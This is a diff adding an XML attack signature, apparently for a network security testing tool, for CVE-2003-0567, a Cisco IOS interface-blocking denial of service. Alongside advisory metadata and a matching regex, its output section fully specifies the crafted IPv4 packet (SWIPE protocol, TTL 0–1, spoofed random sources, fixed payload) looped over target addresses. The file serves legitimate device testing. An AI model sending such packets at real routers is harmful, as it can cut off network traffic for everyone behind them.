@@ -1,0 +1,68 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="CISCO IPv4 Packet Processing Denial of Service (SWIPE)"/>
+    <EngDesc display="true" value="This attack sends a specifically created IPv4 packet representing the SWIPE protocol. Can cause some Cisco equipment to erroneously close down their interfaces, causing a denial of service. This results in all further traffic being dropped by the interface."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="IP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Router"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Cisco"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="IOS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="ALL"/>
+      <item value="IOS"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.cisco.com/warp/public/707/cisco-sa-20030717-blocked.shtml"/>
+    <CVEID display="true" value="CVE-2003-0567"/>
+    <bugtraqID display="true" value="8211"/>
+    <OSVDB display="true" value="2325"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464cded800a900fe009b00c927fd1470"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725875593125000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="IP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X34\X55\X66\X67\X75\X5a\Xab\Xb3\X33\X45\X6b\Xcd\Xef\X00"/>
+    <Created value="1139461719" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="@random(0,1)" Protocol="35" HeaderChecksum="" srcIP="@random(0.0.0.0, 255.255.255.255)" destIP="$destIP" options="" Payload="34556667755aabb333456bcdef00" CE="false" DF="true" MF="false"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
